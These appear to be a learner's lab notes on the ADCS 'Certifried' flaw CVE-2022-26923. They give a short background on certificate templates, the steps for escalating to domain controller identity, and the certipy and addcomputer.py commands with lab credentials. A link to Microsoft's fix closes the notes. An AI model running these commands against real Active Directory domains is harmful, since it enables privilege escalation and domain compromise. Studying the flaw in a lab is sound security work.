# ADCS CVE-2022-26923

## ADCS (Active Directory Certificate Services)

This is the CA, PKI from Microsoft. This will be used for delegating trusts (strictly inside the domain) to users and computers.

## Why this is used
- Encrypt the file system
- Digital signature
- **User authentication**

## Certificate templates
- User (Domain users)
	- UPN (User Principal name) --> SAN (Subject Alternative Name) [Authentication, Idenityty]
- machine (Domain computers)
	- **DNSHostname** [Authen (SPN --> Kerberos), Identity]
## Validity write
- DNShostname
- SPN (Service Principal Name) [Admin != Low privilege Accnt]
## Step
- Foothold
- Register on Computer in the DC
- Remove the SPN
- Chnaging the DNShostname
- Get the Certificate with DNShostname of DC --> done!
## Commands
certipy find -u fcastle@marvel.local -p Password1 -bloodhound -dc-ip 192.168.80.139

certipy req -username fcastle@marvel.local -password Password1 -ca MARVEL-HYDRA-DC-CA -target 192.168.80.139 -template User

certipy auth -pfx fcastle.pfx -dc-ip 192.168.80.139

addcomputer.py marvel.local/fcastle:Password1 -method LDAPS -dc-ip 192.168.80.139 -computer-name 'NEW_PC' -computer-pass 'Password1'

certipy req -u NEW_PC$ -password Password1 -ca MARVEL-HYDRA-DC-CA -target 192.168.80.139 -template Machine 


## Fixes
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923



